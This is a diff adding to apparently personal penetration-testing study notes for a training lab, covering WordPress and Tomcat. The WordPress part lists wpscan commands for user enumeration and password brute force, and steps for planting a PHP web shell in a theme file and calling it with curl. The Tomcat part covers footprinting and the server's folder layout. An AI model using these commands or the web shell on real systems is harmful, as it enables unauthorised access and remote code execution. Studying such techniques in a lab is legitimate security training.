@@ -136,6 +136,12 @@
     - grepping plugins on pages
         - `curl -s http://blog.inlanefreight.local | grep plugins `
 
+- Plugins and themes
+    - `wpscan --url http://10.10.207.150/blog/ -e vp,u`
+
+- Enumerating Users
+    - Observing error on login page `/wp-login.php`. for invalid user and password
+    - wpscan - `wpscan --url http://10.10.207.150/blog/ -e vp,u`
 
 **ATTACKS**
 
@@ -143,6 +149,17 @@
 
 - Plugins with known vulnerabilities
 
+- Brute Force Login Page
+    - `wpscan --url http://10.10.207.150/blog/ --usernames admin --passwords rockyou.txt --max-threads 50`
+    - `sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local`
+
+- Remote code execution via the theme editor.
+
+- One Way
+    - Click on Appearance on the side panel and select Theme Editor. Click on Select after selecting the theme, and we can edit an uncommon page such as `404.php `to add a web shell.
+        - Add php Code: `system($_GET[0]);`
+    - Click on Update File at the bottom to save. We know that WordPress themes are located at /wp-content/themes/<theme name>. We can interact with the web shell via the browser or using `cURL.`
+        - `curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id`
 
 
 
@@ -151,6 +168,41 @@
         - `wpscan --url http://10.10.207.150/blog/ -e vp,u`
     - Brute Force for any username (in this case admin)
         - `wpscan --url http://10.10.207.150/blog/ --usernames admin --passwords rockyou.txt --max-threads 50`
+
+###### Tomcat
+
+**ENUMERATION**
+
+- Discovery/Footprinting
+    -  Server header in the HTTP response. 
+    - 404, Requesting an invalid page should reveal the server and version.
+    -  Another method of detecting a Tomcat server and version is through the /docs page.
+        - `curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat `
+
+- General Folder Structure
+
+├── bin
+├── conf
+│   ├── catalina.policy
+│   ├── catalina.properties
+│   ├── context.xml
+│   ├── tomcat-users.xml
+│   ├── tomcat-users.xsd
+│   └── web.xml
+├── lib
+├── logs
+├── temp
+├── webapps
+│   ├── manager
+│   │   ├── images
+│   │   ├── META-INF
+│   │   └── WEB-INF
+|   |       └── web.xml
+│   └── ROOT
+│       └── WEB-INF
+└── work
+    └── Catalina
+        └── localhost
 
 #### **SMB**
 
